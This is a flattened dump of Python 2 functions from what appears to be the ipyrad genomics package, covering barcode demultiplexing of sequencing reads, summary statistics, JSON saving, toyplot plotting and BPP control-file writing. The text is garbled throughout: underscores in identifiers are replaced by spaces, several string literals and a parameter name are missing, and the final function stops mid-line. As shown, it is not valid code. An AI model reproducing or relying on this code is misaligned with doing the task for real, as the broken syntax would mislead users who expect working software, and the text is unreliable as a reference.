def find3radbcode ( cutters , longbar , read1 ) : ## default barcode string for ambigcuts in cutters : for cutter in ambigcuts : ## If the cutter is unambiguous there will only be one. if not cutter : continue search = read1 [ 1 ] [ : int ( longbar [ 0 ] + len ( cutter ) + 1 ) ] splitsearch = search . rsplit ( cutter , 1 ) if len ( splitsearch ) > 1 : return splitsearch [ 0 ] ## No cutter found return splitsearch [ 0 ]
def make stats ( data , perfile , fsamplehits , fbarhits , fmisses , fdbars ) : ## out file outhandle = os . path . join ( data . dirs . fastqs , 's1 demultiplex stats.txt' ) outfile = open ( outhandle , 'w' ) ## write the header for file stats ------------------------------------ outfile . write ( '{:<35}  {:>13}{:>13}{:>13}\n' . format ( "raw file" , "total reads" , "cut found" , "bar matched" ) ) ## write the file stats r1names = sorted ( perfile ) for fname in r1names : dat = perfile [ fname ] #dat = [perfile[fname][i] for i in ["ftotal", "fcutfound", "fmatched"]] outfile . write ( '{:<35}  {:>13}{:>13}{:>13}\n' . format ( fname , dat [ 0 ] , dat [ 1 ] , dat [ 2 ] ) ) ## repeat for pairfile if 'pair' in data . paramsdict [ "datatype" ] : fname = fname . replace ( " R1 " , " R2 " ) outfile . write ( '{:<35}  {:>13}{:>13}{:>13}\n' . format ( fname , dat [ 0 ] , dat [ 1 ] , dat [ 2 ] ) ) ## spacer, how many records for each sample -------------------------- outfile . write ( '\n{:<35}  {:>13}\n' . format ( "sample name" , "total reads" ) ) ## names alphabetical. Write to file. Will save again below to Samples. snames = set ( ) for sname in data . barcodes : if "-technical-replicate-" in sname : sname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] snames . add ( sname ) for sname in sorted ( list ( snames ) ) : outfile . write ( "{:<35}  {:>13}\n" . format ( sname , fsamplehits [ sname ] ) ) ## spacer, which barcodes were found ----------------------------------- outfile . write ( '\n{:<35}  {:>13} {:>13} {:>13}\n' . format ( "sample name" , "true bar" , "obs bar" , "N records" ) ) ## write sample results for sname in sorted ( data . barcodes ) : if "-technical-replicate-" in sname : fname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] else : fname = sname ## write perfect hit hit = data . barcodes [ sname ] offhitstring = "" ## write off-n hits ## sort list of off-n hits   if fname in fdbars : offkeys = list ( fdbars . get ( fname ) ) for offhit in offkeys [ : : - 1 ] : ## exclude perfect hit if offhit not in data . barcodes . values ( ) : offhitstring += '{:<35}  {:>13} {:>13} {:>13}\n' . format ( sname , hit , offhit , fbarhits [ offhit ] / 2 ) #sumoffhits += fbarhits[offhit] ## write string to file outfile . write ( '{:<35}  {:>13} {:>13} {:>13}\n' . #format(sname, hit, hit, fsamplehits[fname]-sumoffhits)) format ( sname , hit , hit , fbarhits [ hit ] / 2 ) ) outfile . write ( offhitstring ) ## write misses misskeys = list ( fmisses . keys ( ) ) misskeys . sort ( key = fmisses . get ) for key in misskeys [ : : - 1 ] : outfile . write ( '{:<35}  {:>13}{:>13}{:>13}\n' . format ( "no match" , " " , key , fmisses [ key ] ) ) outfile . close ( ) ## Link Sample with this data file to the Assembly object for sname in snames : ## make the sample sample = Sample ( ) sample . name = sname ## allow multiple barcodes if its a replicate.  barcodes = [ ] for n in xrange ( 500 ) : fname = sname + "-technical-replicate-{}" . format ( n ) fbar = data . barcodes . get ( fname ) if fbar : barcodes . append ( fbar ) if barcodes : sample . barcode = barcodes else : sample . barcode = data . barcodes [ sname ] ## file names         if 'pair' in data . paramsdict [ "datatype" ] : sample . files . fastqs = [ ( os . path . join ( data . dirs . fastqs , sname + " R1 .fastq.gz" ) , os . path . join ( data . dirs . fastqs , sname + " R2 .fastq.gz" ) ) ] else : sample . files . fastqs = [ ( os . path . join ( data . dirs . fastqs , sname + " R1 .fastq.gz" ) , "" ) ] ## fill in the summary stats sample . stats [ "reads raw" ] = int ( fsamplehits [ sname ] ) ## fill in the full df stats value sample . stats dfs . s1 [ "reads raw" ] = int ( fsamplehits [ sname ] ) ## Only link Sample if it has data if sample . stats [ "reads raw" ] : sample . stats . state = 1 data . samples [ sample . name ] = sample else : print ( "Excluded sample: no data found for" , sname ) ## initiate s1 key for data object data . stats dfs . s1 = data . build stat ( "s1" ) data . stats files . s1 = outhandle
def barmatch2 ( data , tups , cutters , longbar , matchdict , fnum ) : ## how many reads to store before writing to disk waitchunk = int ( 1e6 ) ## pid name for this engine epid = os . getpid ( ) ## counters for total reads, those with cutsite, and those that matched filestat = np . zeros ( 3 , dtype = np . int ) ## store observed sample matches samplehits = { } ## dictionaries to store first and second reads until writing to file dsort1 = { } dsort2 = { } ## dictionary for all bars matched in sample dbars = { } ## fill for sample names for sname in data . barcodes : if "-technical-replicate-" in sname : sname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] samplehits [ sname ] = 0 dsort1 [ sname ] = [ ] dsort2 [ sname ] = [ ] dbars [ sname ] = set ( ) ## store observed bars barhits = { } for barc in matchdict : barhits [ barc ] = 0 ## store others misses = { } misses [ ' ' ] = 0 ## build func for finding barcode getbarcode = get barcode func ( data , longbar ) ## get quart iterator of reads if tups [ 0 ] . endswith ( ".gz" ) : ofunc = gzip . open else : ofunc = open ## create iterators  ofile1 = ofunc ( tups [ 0 ] , 'r' ) fr1 = iter ( ofile1 ) quart1 = itertools . izip ( fr1 , fr1 , fr1 , fr1 ) if tups [ 1 ] : ofile2 = ofunc ( tups [ 1 ] , 'r' ) fr2 = iter ( ofile2 ) quart2 = itertools . izip ( fr2 , fr2 , fr2 , fr2 ) quarts = itertools . izip ( quart1 , quart2 ) else : quarts = itertools . izip ( quart1 , iter ( int , 1 ) ) ## go until end of the file while 1 : try : read1 , read2 = quarts . next ( ) read1 = list ( read1 ) filestat [ 0 ] += 1 except Stop Iteration : break barcode = "" ## Get barcode R2 and check for matching sample name if '3rad' in data . paramsdict [ "datatype" ] : ## Here we're just reusing the findbcode function ## for R2, and reconfiguring the longbar tuple to have the ## maxlen for the R2 barcode ## Parse barcode. Use the parsing function selected above. barcode1 = find3radbcode ( cutters = cutters , longbar = longbar , read1 = read1 ) barcode2 = find3radbcode ( cutters = cutters , longbar = ( longbar [ 2 ] , longbar [ 1 ] ) , read1 = read2 ) barcode = barcode1 + "+" + barcode2 else : ## Parse barcode. Uses the parsing function selected above. barcode = getbarcode ( cutters , read1 , longbar ) ## find if it matches  sname match = matchdict . get ( barcode ) if sname match : #sample index[filestat[0]-1] = snames.index(sname match) + 1 ## record who matched dbars [ sname match ] . add ( barcode ) filestat [ 1 ] += 1 filestat [ 2 ] += 1 samplehits [ sname match ] += 1 barhits [ barcode ] += 1 if barcode in barhits : barhits [ barcode ] += 1 else : barhits [ barcode ] = 1 ## trim off barcode lenbar = len ( barcode ) if '3rad' in data . paramsdict [ "datatype" ] : ## Iff 3rad trim the len of the first barcode lenbar = len ( barcode1 ) if data . paramsdict [ "datatype" ] == '2brad' : overlen = len ( cutters [ 0 ] [ 0 ] ) + lenbar + 1 read1 [ 1 ] = read1 [ 1 ] [ : - overlen ] + "\n" read1 [ 3 ] = read1 [ 3 ] [ : - overlen ] + "\n" else : read1 [ 1 ] = read1 [ 1 ] [ lenbar : ] read1 [ 3 ] = read1 [ 3 ] [ lenbar : ] ## Trim barcode off R2 and append. Only 3rad datatype ## pays the cpu cost of splitting R2 if '3rad' in data . paramsdict [ "datatype" ] : read2 = list ( read2 ) read2 [ 1 ] = read2 [ 1 ] [ len ( barcode2 ) : ] read2 [ 3 ] = read2 [ 3 ] [ len ( barcode2 ) : ] ## append to dsort dsort1 [ sname match ] . append ( "" . join ( read1 ) ) if 'pair' in data . paramsdict [ "datatype" ] : dsort2 [ sname match ] . append ( "" . join ( read2 ) ) else : misses [ " " ] += 1 if barcode : filestat [ 1 ] += 1 ## how can we make it so all of the engines aren't trying to write to ## ~100-200 files all at the same time? This is the I/O limit we hit.. ## write out at 100K to keep memory low. It is fine on HPC which can  ## write parallel, but regular systems might crash if not filestat [ 0 ] % waitchunk : ## write the remaining reads to file" writetofile ( data , dsort1 , 1 , epid ) if 'pair' in data . paramsdict [ "datatype" ] : writetofile ( data , dsort2 , 2 , epid ) ## clear out dsorts for sample in data . barcodes : if "-technical-replicate-" in sname : sname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] dsort1 [ sname ] = [ ] dsort2 [ sname ] = [ ] ## reset longlist #longlist = np.zeros(waitchunk, dtype=np.uint32)                 ## close open files ofile1 . close ( ) if tups [ 1 ] : ofile2 . close ( ) ## write the remaining reads to file writetofile ( data , dsort1 , 1 , epid ) if 'pair' in data . paramsdict [ "datatype" ] : writetofile ( data , dsort2 , 2 , epid ) ## return stats in saved pickle b/c return queue is too small ## and the size of the match dictionary can become quite large samplestats = [ samplehits , barhits , misses , dbars ] outname = os . path . join ( data . dirs . fastqs , "tmp {} {}.p" . format ( epid , fnum ) ) with open ( outname , 'w' ) as wout : pickle . dump ( [ filestat , samplestats ] , wout ) return outname
def get barcode func ( data , longbar ) : ## build func for finding barcode if longbar [ 1 ] == 'same' : if data . paramsdict [ "datatype" ] == '2brad' : def getbarcode ( cutters , read1 , longbar ) : """ find barcode for 2b RAD data """ return read1 [ 1 ] [ : - ( len ( cutters [ 0 ] [ 0 ] ) + 1 ) ] [ - longbar [ 0 ] : ] else : def getbarcode ( , read1 , longbar ) : """ finds barcode for invariable length barcode data """ return read1 [ 1 ] [ : longbar [ 0 ] ] else : def getbarcode ( cutters , read1 , longbar ) : """ finds barcode for variable barcode lengths""" return findbcode ( cutters , longbar , read1 ) return getbarcode
def get quart iter ( tups ) : if tups [ 0 ] . endswith ( ".gz" ) : ofunc = gzip . open else : ofunc = open ## create iterators  ofile1 = ofunc ( tups [ 0 ] , 'r' ) fr1 = iter ( ofile1 ) quart1 = itertools . izip ( fr1 , fr1 , fr1 , fr1 ) if tups [ 1 ] : ofile2 = ofunc ( tups [ 1 ] , 'r' ) fr2 = iter ( ofile2 ) quart2 = itertools . izip ( fr2 , fr2 , fr2 , fr2 ) quarts = itertools . izip ( quart1 , quart2 ) else : ofile2 = 0 quarts = itertools . izip ( quart1 , iter ( int , 1 ) ) ## make a generator def feedme ( quarts ) : for quart in quarts : yield quart genquarts = feedme ( quarts ) ## return generator and handles return genquarts , ofile1 , ofile2
def writetofastq ( data , dsort , read ) : if read == 1 : rrr = "R1" else : rrr = "R2" for sname in dsort : ## skip writing if empty. Write to tmpname handle = os . path . join ( data . dirs . fastqs , "{} {} .fastq" . format ( sname , rrr ) ) with open ( handle , 'a' ) as out : out . write ( "" . join ( dsort [ sname ] ) )
def collate files ( data , sname , tmp1s , tmp2s ) : ## out handle out1 = os . path . join ( data . dirs . fastqs , "{} R1 .fastq.gz" . format ( sname ) ) out = io . Buffered Writer ( gzip . open ( out1 , 'w' ) ) ## build cmd cmd1 = [ 'cat' ] for tmpfile in tmp1s : cmd1 += [ tmpfile ] ## compression function proc = sps . Popen ( [ 'which' , 'pigz' ] , stderr = sps . PIPE , stdout = sps . PIPE ) . communicate ( ) if proc [ 0 ] . strip ( ) : compress = [ "pigz" ] else : compress = [ "gzip" ] ## call cmd proc1 = sps . Popen ( cmd1 , stderr = sps . PIPE , stdout = sps . PIPE ) proc2 = sps . Popen ( compress , stdin = proc1 . stdout , stderr = sps . PIPE , stdout = out ) err = proc2 . communicate ( ) if proc2 . returncode : raise I Pyrad Warning Exit ( "error in collate files R1 %s" , err ) proc1 . stdout . close ( ) out . close ( ) ## then cleanup for tmpfile in tmp1s : os . remove ( tmpfile ) if 'pair' in data . paramsdict [ "datatype" ] : ## out handle out2 = os . path . join ( data . dirs . fastqs , "{} R2 .fastq.gz" . format ( sname ) ) out = io . Buffered Writer ( gzip . open ( out2 , 'w' ) ) ## build cmd cmd1 = [ 'cat' ] for tmpfile in tmp2s : cmd1 += [ tmpfile ] ## call cmd proc1 = sps . Popen ( cmd1 , stderr = sps . PIPE , stdout = sps . PIPE ) proc2 = sps . Popen ( compress , stdin = proc1 . stdout , stderr = sps . PIPE , stdout = out ) err = proc2 . communicate ( ) if proc2 . returncode : raise I Pyrad Warning Exit ( "error in collate files R2 %s" , err ) proc1 . stdout . close ( ) out . close ( ) ## then cleanup for tmpfile in tmp2s : os . remove ( tmpfile )
def inverse barcodes ( data ) : matchdict = { } bases = set ( "CATGN" ) poss = set ( ) ## do perfect matches for sname , barc in data . barcodes . items ( ) : ## remove -technical-replicate-N if present if "-technical-replicate-" in sname : sname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] matchdict [ barc ] = sname poss . add ( barc ) if data . paramsdict [ "max barcode mismatch" ] > 0 : ## get 1-base diffs for idx1 , base in enumerate ( barc ) : diffs = bases . difference ( base ) for diff in diffs : lbar = list ( barc ) lbar [ idx1 ] = diff tbar1 = "" . join ( lbar ) if tbar1 not in poss : matchdict [ tbar1 ] = sname poss . add ( tbar1 ) else : if matchdict . get ( tbar1 ) != sname : print ( . format ( sname , barc , matchdict [ tbar1 ] , data . barcodes [ matchdict [ tbar1 ] ] , data . paramsdict [ "max barcode mismatch" ] ) ) ## if allowing two base difference things get big ## for each modified bar, allow one modification to other bases if data . paramsdict [ "max barcode mismatch" ] > 1 : for idx2 , in enumerate ( tbar1 ) : ## skip the base that is already modified if idx2 != idx1 : for diff in bases . difference ( tbar1 [ idx2 ] ) : ltbar = list ( tbar1 ) ltbar [ idx2 ] = diff tbar2 = "" . join ( ltbar ) if tbar2 not in poss : matchdict [ tbar2 ] = sname poss . add ( tbar2 ) else : if matchdict . get ( tbar2 ) != sname : print ( . format ( sname , barc , matchdict [ tbar2 ] , data . barcodes [ matchdict [ tbar2 ] ] , data . paramsdict [ "max barcode mismatch" ] ) ) return matchdict
def cleanup and die ( data ) : tmpfiles = glob . glob ( os . path . join ( data . dirs . fastqs , "tmp * R*.fastq" ) ) tmpfiles += glob . glob ( os . path . join ( data . dirs . fastqs , "tmp *.p" ) ) for tmpf in tmpfiles : os . remove ( tmpf )
def splitfiles ( data , raws , ipyclient ) : ## create a tmpdir for chunked files and a chunk optimizer  tmpdir = os . path . join ( data . paramsdict [ "project dir" ] , "tmp-chunks-" + data . name ) if os . path . exists ( tmpdir ) : shutil . rmtree ( tmpdir ) os . makedirs ( tmpdir ) ## chunk into 8M reads totalreads = estimate optim ( data , raws [ 0 ] [ 0 ] , ipyclient ) optim = int ( 8e6 ) njobs = int ( totalreads / ( optim / 4. ) ) * len ( raws ) ## if more files than cpus: no chunking nosplit = 0 if ( len ( raws ) > len ( ipyclient ) ) or ( totalreads < optim ) : nosplit = 1 ## send slices N at a time. The dict chunkfiles stores a tuple of rawpairs ## dictionary to store asyncresults for sorting jobs start = time . time ( ) chunkfiles = { } for fidx , tups in enumerate ( raws ) : handle = os . path . splitext ( os . path . basename ( tups [ 0 ] ) ) [ 0 ] ## if number of lines is > 20M then just submit it if nosplit : chunkfiles [ handle ] = [ tups ] else : ## chunk the file using zcat make temps chunklist = zcat make temps ( data , tups , fidx , tmpdir , optim , njobs , start ) chunkfiles [ handle ] = chunklist if not nosplit : print ( "" ) return chunkfiles
def demux ( data , chunkfiles , cutters , longbar , matchdict , ipyclient ) : ## parallel stuff start = time . time ( ) printstr = ' sorting reads         | {} | s1 |' lbview = ipyclient . load balanced view ( ) ## store statcounters and async results in dicts perfile = { } filesort = { } for handle , rawtuplist in chunkfiles . items ( ) : ## get args for job for fidx , rawtuple in enumerate ( rawtuplist ) : #handle = os.path.splitext(os.path.basename(rawtuple[0]))[0] args = ( data , rawtuple , cutters , longbar , matchdict , fidx ) ## submit the job filesort [ handle ] = lbview . apply ( barmatch , * args ) ## get ready to receive stats: 'total', 'cutfound', 'matched' perfile [ handle ] = np . zeros ( 3 , dtype = np . int ) ## stats for each sample fdbars = { } fsamplehits = Counter ( ) fbarhits = Counter ( ) fmisses = Counter ( ) ## a tuple to hold my dictionaries statdicts = perfile , fsamplehits , fbarhits , fmisses , fdbars try : kbd = 0 total = len ( chunkfiles ) done = 0 ## wait for jobs to finish while 1 : fin = [ i for i , j in filesort . items ( ) if j . ready ( ) ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( total , done , printstr . format ( elapsed ) , spacer = data . spacer ) time . sleep ( 0.1 ) ## should we break? if total == done : print ( "" ) break ## cleanup for job in fin : if filesort [ job ] . successful ( ) : pfile = filesort [ job ] . result ( ) #if result: if pfile : ## check if this needs to return data putstats ( pfile , handle , statdicts ) ## purge to conserve memory del filesort [ job ] done += 1 ## keep tacking progreess during writing stage start = time . time ( ) printstr = ' writing/compressing   | {} | s1 |' elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 10 , 0 , printstr . format ( elapsed ) , spacer = data . spacer ) except Keyboard Interrupt : ## wait to cleanup kbd = 1 raise ## only proceed here if barmatch jobs were not interrupted else : ## collate files and do progress bar ftmps = glob . glob ( os . path . join ( data . dirs . fastqs , "tmp *.fastq" ) ) ## a dict to assign tmp files to names/reads r1dict = { } r2dict = { } for sname in data . barcodes : r1dict [ sname ] = [ ] r2dict [ sname ] = [ ] ## assign to name keys for ftmp in ftmps : ## split names base , orient , = ftmp . rsplit ( " " , 2 ) sname = base . rsplit ( "/" , 1 ) [ - 1 ] . split ( "tmp " , 1 ) [ 1 ] ## put into dicts if orient == "R1" : r1dict [ sname ] . append ( ftmp ) else : r2dict [ sname ] . append ( ftmp ) ## concatenate files total = len ( data . barcodes ) done = 0 ## store asyncs of collate jobs writers = [ ] for sname in data . barcodes : tmp1s = sorted ( r1dict [ sname ] ) tmp2s = sorted ( r2dict [ sname ] ) writers . append ( lbview . apply ( collate files , * [ data , sname , tmp1s , tmp2s ] ) ) ## track progress of collate jobs while 1 : ready = [ i . ready ( ) for i in writers ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( total , sum ( ready ) , printstr . format ( elapsed ) , spacer = data . spacer ) time . sleep ( 0.1 ) if all ( ready ) : print ( "" ) break finally : ## clean up junk files tmpfiles = glob . glob ( os . path . join ( data . dirs . fastqs , "tmp * R*.fastq" ) ) tmpfiles += glob . glob ( os . path . join ( data . dirs . fastqs , "tmp *.p" ) ) for tmpf in tmpfiles : os . remove ( tmpf ) if kbd : raise Keyboard Interrupt ( ) else : ## build stats from dictionaries perfile , fsamplehits , fbarhits , fmisses , fdbars = statdicts make stats ( data , perfile , fsamplehits , fbarhits , fmisses , fdbars )
def putstats ( pfile , handle , statdicts ) : ## load in stats with open ( pfile , 'r' ) as infile : filestats , samplestats = pickle . load ( infile ) ## get dicts from statdicts tuple perfile , fsamplehits , fbarhits , fmisses , fdbars = statdicts ## pull new stats #handle = os.path.splitext(os.path.basename(handle))[0] perfile [ handle ] += filestats ## update sample stats samplehits , barhits , misses , dbars = samplestats fsamplehits . update ( samplehits ) fbarhits . update ( barhits ) fmisses . update ( misses ) fdbars . update ( dbars ) ## repack the tuple and return statdicts = perfile , fsamplehits , fbarhits , fmisses , fdbars return statdicts
def plotshare ( share , names , * * kwargs ) : ## set the colormap colormap = toyplot . color . Linear Map ( toyplot . color . brewer . palette ( "Spectral" ) , domain min = share . min ( ) , domain max = share . max ( ) ) ## set up canvas if not kwargs . get ( 'width' ) : width = 900 else : width = kwargs [ 'width' ] canvas = toyplot . Canvas ( width = width , height = width * 0.77778 ) ## order the dta table = canvas . matrix ( ( share , colormap ) , bounds = ( 50 , canvas . height - 100 , 50 , canvas . height - 100 ) , step = 5 , tshow = False , lshow = False ) ## put a box around the table table . body . grid . vlines [ ... , [ 0 , - 1 ] ] = 'single' table . body . grid . hlines [ [ 0 , - 1 ] , ... ] = 'single' ## make hover info on grid for i , j in itertools . product ( range ( len ( share ) ) , repeat = 2 ) : table . body . cell ( i , j ) . title = "%s, %s : %s" % ( names [ i ] , names [ j ] , int ( share [ i , j ] ) ) ## create barplot axes = canvas . cartesian ( bounds = ( 665 , 800 , 90 , 560 ) ) ## make a hover for barplot zf = zip ( names [ : : - 1 ] , share . diagonal ( ) [ : : - 1 ] ) barfloater = [ "%s: %s" % ( i , int ( j ) ) for i , j in zf ] ## plot bars axes . bars ( share . diagonal ( ) [ : : - 1 ] , along = 'y' , title = barfloater ) ## hide spine, move labels to the left,  ## use taxon names, rotate angle, align axes . y . spine . show = False axes . y . ticks . labels . offset = 0 axes . y . ticks . locator = toyplot . locator . Explicit ( range ( len ( names ) ) , labels = names [ : : - 1 ] ) axes . y . ticks . labels . angle = - 90 axes . y . ticks . labels . style = { "baseline-shift" : 0 , "text-anchor" : "end" , "font-size" : "8px" } ## rotate xlabels, align with ticks, change to thousands, move up on canvas ## show ticks, and hide popup coordinates axes . x . ticks . labels . angle = 90 axes . x . ticks . labels . offset = 20 axes . x . ticks . locator = toyplot . locator . Explicit ( range ( 0 , int ( share . max ( ) ) , int ( share . max ( ) / 10 ) ) , [ "{}" . format ( i ) for i in range ( 0 , int ( share . max ( ) ) , int ( share . max ( ) / 10 ) ) ] ) axes . x . ticks . labels . style = { "baseline-shift" : 0 , "text-anchor" : "end" , "-toyplot-anchor-shift" : "15px" } axes . x . ticks . show = True ## add labels label style = { "font-size" : "16px" , "font-weight" : "bold" } canvas . text ( 300 , 60 , "Matrix of shared RAD loci" , style = label style ) canvas . text ( 700 , 60 , "N RAD loci per sample" , style = label style ) return canvas , axes
def countmatrix ( lxs ) : ## an empty matrix share = np . zeros ( ( lxs . shape [ 0 ] , lxs . shape [ 0 ] ) ) ## fill above names = range ( lxs . shape [ 0 ] ) for row in lxs : for samp1 , samp2 in itertools . combinations ( names , 2 ) : shared = lxs [ samp1 , lxs [ samp2 ] > 0 ] . sum ( ) share [ samp1 , samp2 ] = shared ## mirror below ##share[] ## fill diagonal with total sample coverage for row in xrange ( len ( names ) ) : share [ row , row ] = lxs [ row ] . sum ( ) return share
def paramname ( param = "" ) : try : name = pinfo [ str ( param ) ] [ 0 ] . strip ( ) . split ( " " ) [ 1 ] except ( Key Error , Value Error ) as err : ## TODO: paramsinfo get description by param string not working. ## It would be cool to have an assembly object bcz then you could ## just do this: ## ## print(pinfo[data.paramsinfo.keys().index(param)]) print ( "\t Key name/number not recognized - " . format ( param ) , err ) raise return name
def save json2 ( data ) : ## convert everything to dicts ## skip  ipcluster cuz it's made new. datadict = Ordered Dict ( [ ( "outfiles" , data . dict [ "outfiles" ] ) , ( "stats files" , dict ( data . dict [ "stats files" ] ) ) , ( "stats dfs" , data . dict [ "stats dfs" ] ) ] )
def save json ( data ) : ## data as dict #### skip  ipcluster because it's made new #### skip  headers because it's loaded new #### statsfiles save only keys #### samples save only keys datadict = Ordered Dict ( [ ( " version" , data . dict [ " version" ] ) , ( " checkpoint" , data . dict [ " checkpoint" ] ) , ( "name" , data . dict [ "name" ] ) , ( "dirs" , data . dict [ "dirs" ] ) , ( "paramsdict" , data . dict [ "paramsdict" ] ) , ( "samples" , data . dict [ "samples" ] . keys ( ) ) , ( "populations" , data . dict [ "populations" ] ) , ( "database" , data . dict [ "database" ] ) , ( "clust database" , data . dict [ "clust database" ] ) , ( "outfiles" , data . dict [ "outfiles" ] ) , ( "barcodes" , data . dict [ "barcodes" ] ) , ( "stats files" , data . dict [ "stats files" ] ) , ( " hackersonly" , data . dict [ " hackersonly" ] ) , ] ) ## sample dict sampledict = Ordered Dict ( [ ] ) for key , sample in data . samples . iteritems ( ) : sampledict [ key ] = sample . to fulldict ( ) ## json format it using cumstom Encoder class fulldumps = json . dumps ( { "assembly" : datadict , "samples" : sampledict } , cls = Encoder , sort keys = False , indent = 4 , separators = ( "," , ":" ) , ) ## save to file assemblypath = os . path . join ( data . dirs . project , data . name + ".json" ) if not os . path . exists ( data . dirs . project ) : os . mkdir ( data . dirs . project ) ## protect save from interruption done = 0 while not done : try : with open ( assemblypath , 'w' ) as jout : jout . write ( fulldumps ) done = 1 except ( Keyboard Interrupt , System Exit ) : print ( '.' ) continue
def encode ( self , obj ) : def hint tuples ( item ) : """ embeds  tuple  hinter in json strings """ if isinstance ( item , tuple ) : return { ' tuple ' : True , 'items' : item } if isinstance ( item , list ) : return [ hint tuples ( e ) for e in item ] if isinstance ( item , dict ) : return { key : hint tuples ( val ) for key , val in item . iteritems ( ) } else : return item return super ( Encoder , self ) . encode ( hint tuples ( obj ) )
def depthplot ( data , samples = None , dims = ( None , None ) , canvas = ( None , None ) , xmax = 50 , log = False , outprefix = None , use maxdepth = False ) : ## select samples to be plotted, requires depths info if not samples : samples = data . samples . keys ( ) samples . sort ( ) subsamples = Ordered Dict ( [ ( i , data . samples [ i ] ) for i in samples ] ) ## get canvas dimensions based on n-samples if any ( dims ) : ## user-supplied dimensions (...) print ( "userdims" ) else : if len ( subsamples ) <= 4 : ## set dimension to N samples  dims = ( 1 , len ( subsamples ) ) else : dims = ( len ( subsamples ) / 4 , 4 ) ## create canvas if any ( canvas ) : print ( "usercanvas" ) canvas = toyplot . Canvas ( width = canvas [ 0 ] , height = canvas [ 1 ] ) else : canvas = toyplot . Canvas ( width = 200 * dims [ 1 ] , height = 150 * dims [ 0 ] ) ## get all of the data arrays for panel , sample in enumerate ( subsamples ) : ## statistical called bins statdat = subsamples [ sample ] . depths statdat = statdat [ statdat >= data . paramsdict [ "mindepth statistical" ] ] if use maxdepth : statdat = { i : j for ( i , j ) in statdat if i < data . paramsdict [ "maxdepth" ] } sdat = np . histogram ( statdat , range ( 50 ) ) ## majrule called bins statdat = subsamples [ sample ] . depths statdat = statdat [ statdat < data . paramsdict [ "mindepth statistical" ] ] statdat = statdat [ statdat >= data . paramsdict [ "mindepth majrule" ] ] if use maxdepth : statdat = statdat [ statdat < data . paramsdict [ "maxdepth" ] ] mdat = np . histogram ( statdat , range ( 50 ) ) ## excluded bins tots = data . samples [ sample ] . depths tots = tots [ tots < data . paramsdict [ "mindepth majrule" ] ] if use maxdepth : tots = tots [ tots < data . paramsdict [ "maxdepth" ] ] edat = np . histogram ( tots , range ( 50 ) ) ## fill in each panel of canvas with a sample axes = canvas . cartesian ( grid = ( dims [ 0 ] , dims [ 1 ] , panel ) , gutter = 25 ) axes . x . domain . xmax = xmax axes . label . text = sample if log : axes . y . scale = "log" # heights = np.column stack((sdat,mdat,edat)) axes . bars ( sdat ) axes . bars ( edat ) axes . bars ( mdat ) ## return objects to be saved... if outprefix : toyplot . html . render ( canvas , fobj = outprefix + ".html" ) toyplot . svg . render ( canvas , fobj = outprefix + ".svg" )
def parse 00 ( ofile ) : with open ( ofile ) as infile : ## read in the results summary from the end of the outfile arr = np . array ( [ " " ] + infile . read ( ) . split ( "Summary of MCMC results\n\n\n" ) [ 1 : ] [ 0 ] . strip ( ) . split ( ) ) ## reshape array  rows = 12 cols = ( arr . shape [ 0 ] + 1 ) / rows arr = arr . reshape ( rows , cols ) ## make into labeled data frame df = pd . Data Frame ( data = arr [ 1 : , 1 : ] , columns = arr [ 0 , 1 : ] , index = arr [ 1 : , 0 ] , ) . T return df
def parse 01 ( ofiles , individual = False ) : ## parse results from outfiles cols = [ ] dats = [ ] for ofile in ofiles : ## parse file with open ( ofile ) as infile : dat = infile . read ( ) lastbits = dat . split ( ".mcmc.txt\n\n" ) [ 1 : ] results = lastbits [ 0 ] . split ( "\n\n" ) [ 0 ] . split ( ) ## get shape from ... shape = ( ( ( len ( results ) - 3 ) / 4 ) , 4 ) dat = np . array ( results [ 3 : ] ) . reshape ( shape ) cols . append ( dat [ : , 3 ] . astype ( float ) ) if not individual : ## get mean results across reps cols = np . array ( cols ) cols = cols . sum ( axis = 0 ) / len ( ofiles ) #10. dat [ : , 3 ] = cols . astype ( str ) ## format as a DF df = pd . Data Frame ( dat [ : , 1 : ] ) df . columns = [ "delim" , "prior" , "posterior" ] nspecies = 1 + np . array ( [ list ( i ) for i in dat [ : , 1 ] ] , dtype = int ) . sum ( axis = 1 ) df [ "nspecies" ] = nspecies return df else : ## get mean results across reps #return cols res = [ ] for i in xrange ( len ( cols ) ) : x = dat x [ : , 3 ] = cols [ i ] . astype ( str ) x = pd . Data Frame ( x [ : , 1 : ] ) x . columns = [ 'delim' , 'prior' , 'posterior' ] nspecies = 1 + np . array ( [ list ( i ) for i in dat [ : , 1 ] ] , dtype = int ) . sum ( axis = 1 ) x [ "nspecies" ] = nspecies res . append ( x ) return res
def write ctlfile ( self ) : #, rep=None): ## A string to store ctl info ctl = [ ] ## write the top header info ctl . append ( "seed = {}" . format ( self . params . seed ) ) ctl . append ( "seqfile = {}" . format ( self . seqfile ) ) ctl . append ( "Imapfile = {}" . format ( self . mapfile ) ) path = os . path . realpath ( os . path . join ( self . workdir , self . name ) ) mcmcfile = "{}.mcmc.txt" . format ( path ) outfile = "{}.out.txt" . format ( path ) if mcmcfile not in self . files . mcmcfiles : self . files . mcmcfiles . append ( mcmcfile ) if outfile not in self . files . outfiles : self . files . outfiles . append ( outfile ) ctl . append ( "mcmcfile = {}" . format ( mcmcfile ) ) ctl . append ( "outfile = {}" . format ( outfile ) ) ## number of loci (checks that seq file exists and parses from there) ctl . append ( "nloci = {}" . format ( self . nloci ) ) ctl . append ( "usedata = {}" . format ( self . params . usedata ) ) ctl . append ( "cleandata = {}" . format ( self . params . cleandata ) ) ## infer species tree if self . params . infer sptree : ctl . append ( "speciestree = 1 0.4 0.2 0.1" ) else : ctl . append ( "speciestree = 0" ) ## infer delimitation (with algorithm 1 by default) ctl . append ( "speciesdelimitation = {} {} {}" . format ( self . params . infer delimit , self . params . delimit alg [ 0 ] , " " . join ( [ str ( i ) for i in self . params . delimit alg [ 1 : ] ] ) ) ) ## get tree values nspecies = str ( len ( self . imap ) ) species = " " . join ( sorted ( self . imap ) ) ninds = " " . join ( [ str ( len ( self . imap [ i ] ) ) for i in sorted ( self . imap ) ] ) ctl . append ( SPECIESTREE . format ( nspecies , species , ninds , self . tree . write ( format = 9 ) ) ) ## priors ctl . append ( "thetaprior = {} {}" . format 